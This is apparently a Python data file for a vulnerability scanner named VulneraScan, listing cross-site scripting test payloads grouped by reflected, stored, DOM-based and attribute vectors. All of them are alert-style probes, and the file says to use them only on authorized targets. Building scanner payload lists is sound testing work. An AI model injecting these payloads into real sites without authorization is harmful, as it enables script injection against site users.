# XSS payloads for VulneraScan
# These payloads are organized into lists based on XSS attack vectors for easy extraction during testing.
# Each list targets different injection points (e.g., input fields, URLs, attributes) to detect XSS vulnerabilities.
# Usage: Import and iterate over lists in your vulnerability scanner (e.g., main.py or a new service).
# Note: Use responsibly and only on authorized targets like testphp.vulnweb.com.

# Reflected XSS payloads
# Purpose: Test for XSS in URL parameters or input fields that reflect user input without sanitization.
REFLECTED_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",               # Basic alert popup
    "<img src=x onerror=alert('XSS')>",           # Image tag with error event
    "';alert('XSS');//",                          # JavaScript injection with comment
    "<svg onload=alert('XSS')>",                  # SVG event trigger
    "<input type='text' value='' onfocus=alert('XSS') autofocus>", # Input field event
]

# Stored XSS payloads
# Purpose: Test for XSS in forms or comments that store input and display it to users.
STORED_XSS_PAYLOADS = [
    "<script>document.write('XSS')</script>",     # Write directly to document
    "<div onmouseover=alert('XSS')>Hover</div>",  # Mouseover event trigger
    "<iframe src=javascript:alert('XSS')></iframe>", # Iframe with JavaScript
    "<textarea onfocus=alert('XSS') autofocus>XSS</textarea>", # Textarea event
    "<body onload=alert('XSS')>",                 # Body load event
]

# DOM-based XSS payloads
# Purpose: Test for XSS in client-side JavaScript that processes URL fragments or input.
DOM_XSS_PAYLOADS = [
    "#<script>alert('XSS')</script>",              # URL fragment injection
    "javascript:alert('XSS')",                     # JavaScript protocol
    "data:text/html,<script>alert('XSS')</script>", # Data URI injection
    "<base href='javascript:alert(\"XSS\")//'>",  # Base tag manipulation
    "eval(location.hash.substr(1))",               # Eval with URL hash
]

# Attribute-based XSS payloads
# Purpose: Test for XSS in HTML attributes that execute JavaScript without proper sanitization.
ATTRIBUTE_XSS_PAYLOADS = [
    "onerror=alert('XSS')",                       # Error event in attributes
    "onload=alert('XSS')",                        # Load event in attributes
    "onclick=alert('XSS')",                       # Click event in attributes
    "onmouseover=alert('XSS')",                   # Mouseover event in attributes
    "autofocus onfocus=alert('XSS')",             # Focus event in attributes
]